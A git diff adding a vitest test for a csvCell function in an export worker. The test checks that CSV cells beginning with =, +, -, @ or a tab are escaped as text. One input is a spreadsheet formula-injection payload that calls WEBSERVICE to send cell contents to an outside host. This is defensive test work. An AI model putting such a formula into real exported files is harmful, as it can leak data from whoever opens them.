@@ -19,7 +19,7 @@ import { createTestDatabase, testAdminUrl, type TestDatabase } from '@fdv/db/tes
 import { LocalAdapter } from '@fdv/storage';
 import pg from 'pg';
 import { afterAll, beforeAll, describe, expect, it } from 'vitest';
-import { buildExport } from './export.js';
+import { buildExport, csvCell } from './export.js';
 import { decryptToBuffer } from './process-version.js';
 
 const MASTER = 'worker-test-master-key-with-32-bytes-or-more';
@@ -44,6 +44,25 @@ function zipEntries(zip: Buffer): Map<string, Buffer> {
   }
   return out;
 }
+
+describe('index.csv', () => {
+  it('a cell a spreadsheet would run as a formula is written as text', () => {
+    expect(csvCell('=WEBSERVICE("https://example.test/?"&A2)')).toBe(
+      `"'=WEBSERVICE(""https://example.test/?""&A2)"`,
+    );
+    expect(csvCell('+44 20 7946 0000')).toBe("'+44 20 7946 0000");
+    expect(csvCell('-1+1')).toBe("'-1+1");
+    expect(csvCell('@SUM(A1)')).toBe("'@SUM(A1)");
+    expect(csvCell('\t=1')).toBe("'\t=1");
+    expect(csvCell(['=1', 'tax'])).toBe("'=1 tax");
+    // Everything else as it was.
+    expect(csvCell('Barclays')).toBe('Barclays');
+    expect(csvCell('Smith, Jones & Co')).toBe('"Smith, Jones & Co"');
+    expect(csvCell('a\rb')).toBe('"a\rb"');
+    expect(csvCell(3)).toBe('3');
+    expect(csvCell(null)).toBe('');
+  });
+});
 
 describe.skipIf(!testAdminUrl())('export.build job', () => {
   let tdb: TestDatabase;
